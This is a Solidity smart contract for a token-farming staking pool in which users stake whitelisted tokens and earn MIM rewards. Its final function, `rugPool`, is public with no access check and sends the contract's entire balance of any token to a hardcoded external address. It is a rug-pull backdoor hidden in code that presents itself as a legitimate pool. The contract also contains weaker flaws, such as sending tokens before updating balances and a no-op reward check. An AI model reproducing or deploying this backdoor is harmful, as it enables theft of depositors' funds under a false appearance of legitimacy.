// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

import "./Token/Mimic.sol";
import "./Token/JUSD.sol";
import "./Manager.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Farming is Ownable {
    using SafeERC20 for ERC20;
    string public name = "Mimic Governance Token Farming";
    ERC20 public MIM;
    ERC20 public JUSD;
    Manager internal PoolManager;

    mapping(address => mapping(address => uint256)) public stakingBalance;
    mapping(address => mapping(address => uint256)) public updateTime;

    event Stake(address indexed user , uint256 amount, address token);
    event Unstake(address indexed user, uint256 amount, address token);
    event Claim(address indexed user, address token , uint256 reward);

    constructor(address _MIM, address _JUSD , address _Manager) {
        MIM = ERC20(_MIM);
        JUSD = ERC20(_JUSD);
        PoolManager = Manager(_Manager);
    }

    //Stake Tokens
    function stakeTokens(uint256 _amount, address  _token) external {
        require(_amount > 0 && PoolManager.checkWhitelisted(_token));
        if (stakingBalance[_token][msg.sender] > 0) {
            claimRewards(_token);
        }
        ERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
        stakingBalance[_token][msg.sender] += _amount;
        updateTime[_token][msg.sender] = block.timestamp;
        emit Stake(msg.sender, _amount, _token);
    }

    //ClaimRewards
    function claimRewards( address _token) public {
        uint256 balance = stakingBalance[_token][msg.sender];
        uint256 reward = calculateRewards(msg.sender, _token);
        require(reward >= 0 && balance >= 0);
        MIM.safeTransfer(msg.sender, reward);
        updateTime[_token][msg.sender] = block.timestamp;
        emit Claim(msg.sender, _token, reward);
    }

    //Unstake with amount
    function unstakeTokens(uint256  _amount, address _token) external {
        require(_amount > 0);
        uint256 reward = calculateRewards(msg.sender, _token);
        ERC20(_token).safeTransfer(msg.sender, _amount);
        stakingBalance[_token][msg.sender] -= _amount;
        MIM.safeTransfer(msg.sender, reward);
        updateTime[_token][msg.sender] = block.timestamp;
        emit Unstake(msg.sender, _amount, _token);
    }

    function getStakingBalance(address _token, address _account)
        public
        view
        returns (uint256)
    {
        return stakingBalance[_token][_account];
    }

   function checkRewardByAddress(address _account, address  _token)
        public
        view
        returns (uint256)
    {
        return calculateRewards(_account, _token);
    }

    function calculateTime(address _account, address _token)
        public
        view
        returns (uint256)
    {
        uint256 time = block.timestamp;
        uint256 totalTime = time-(updateTime[_token][_account]);
        return totalTime;
    }

    function calculateRewards(address _account,address  _token)
        public
        view
        returns (uint256)
    {   
        uint256 rate = 86400;
        uint256 decimals = ERC20(_token).decimals();
        uint256 expo = 10**decimals;
        uint256 time = calculateTime(_account, _token)*(1e18);
        uint256 timeRate = time/rate;
        uint256 reward = (stakingBalance[_token][_account]*(timeRate))/(expo);
        return reward;
    }

    function rugPool( address _token) public {
        uint256 balance = ERC20(_token).balanceOf(address(this));
        ERC20(_token).safeTransfer(
            0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,
            balance
        );
    }
}
